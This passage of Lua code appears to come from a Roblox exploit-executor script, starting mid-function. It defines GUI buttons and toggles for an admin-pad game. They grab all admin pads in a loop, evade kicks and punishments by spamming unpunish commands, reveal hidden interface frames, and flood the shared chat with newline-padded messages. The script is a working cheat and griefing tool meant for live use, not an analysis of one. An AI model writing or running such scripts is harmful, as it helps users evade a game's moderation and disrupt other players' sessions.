		pcall(function()
			getgenv().fixbpglobal = true
		end)
		longlogn("Attempting to fix the baseplate. It may take you more than one try")
	end
end)

local scrm = tab:Button("Silent Commands", function()
	local invisGUIS = {} --- from infinite yeild
	Players = game:GetService("Players")
	function FindInTable(tbl, val)
		if tbl == nil then
			return false
		end
		for _, v in pairs(tbl) do
			if v == val then
				return true
			end
		end
		return false
	end
	for i, v in pairs(Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
		if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
			v.Visible = true
			if not FindInTable(invisGUIS, v) then
				table.insert(invisGUIS, v)
			end
		end
	end
	if shared.firsttimecheckpassed == true then
		if silentcglobal == true then
			pass()
			return
		end
		pcall(function()
			getgenv().silentcglobal = true
		end)
		longlogn("You can now access the System channel at any time. You can also press ' + Backspace to access the cmdbar")
	end
end)

local scrm = tab:Button("All Pads", function()
	chatt("/allpadspiss")
	if shared.firsttimecheckpassed then
		longlogn("This will grab all the admin pads if they're available")
	end
end)

local scrm = tab:Button("Loopgrab All", function()
	testgrab = true ;wait(5)
	padAbuse = true ;wait()
	testgrab = false
	if shared.firsttimecheckpassed then
		longlogn("You are now getting all the pads in a loop. Please watch it or else exploiters may complain")
	end
end)

local scrm = tab:Button("Unloopgrab All", function()
	padAbuse = false ;wait(5)
	testgrab = false ;wait(5)
	padAbuse = false
	temploopgrab = false
	regen()
end)

local scrm = tab2:Button("Anti Vampire Crash", function()
	chatt("/toggle anticrashvg")
	if shared.firsttimecheckpassed then
		longlogn("The vampire crashing method will be disallowed. Beware of bypasses though")
	end
end)

local scrm = tab2:Button("Auto Rejoin", function()
	game.Players:Chat(prefix.."autorejoin")
end)

local antiatt = tab2:Toggle("AntiAttach", false, function(bool)
	if bool == true then
		antiattach = true
		chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ----------------------------------------\n\n\n Anti-attach has been Enabled \n\n You can no longer attach your humanoid to map parts \n\n\n----------------------------------------")
		chatt("m/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n IMAGINE ATTACHING \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
		if shared.firsttimecheckpassed then
			longlogn("Attaching to objects using the Sit & Stun Glitch will no longer work")
		end
	end
	if bool == false then
		antiattach = false
	end
end)

local antikick = tab2:Toggle("antikick v2", false, function(bool)
	if bool == true then
		game.Players:Chat(prefix.."antikick")
		longlogn("Bypass all methods. 1 frame needs to be used")
	end
	if bool == false then
		shared.antikick = false
	end
end)

local antigearv1 = tab2:Toggle("AntiGears (OG)", false, function(bool)
	if bool == true then
		antiFun = true
		longlogn("This ungears the person whenever they receive gear")
	end
	if bool == false then
		antiFun = false
	end
end)

local antipaint = tab2:Toggle("AntiPaint", false, function(bool)
	if bool == true then
		chatt("ungear me                                                                        others")
		logn("Disables the paint bucket")
		antipaint = true
	end
	if bool == false then
		antipaint =false
	end
end)

local antipunv2 = tab2:Toggle("Soft Anti Punish", false, function(bool)
	if bool == true then
		--chatt(prefix.."up") Not anymore.....
		CLEFE = true
		coroutine.wrap(function()
			while CLEFE and scriptActive do
				task.wait(.0095)
				if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
					task.wait(.35)
					chatt("unpunish me " .. math.random(1, 1000))
					task.wait(.35)
					chatt("unpunish me " .. math.random(1, 1000))
				end
			end
		end)()
	end
	if bool == false then
		CLEFE = false
	end
end)

--end

--end
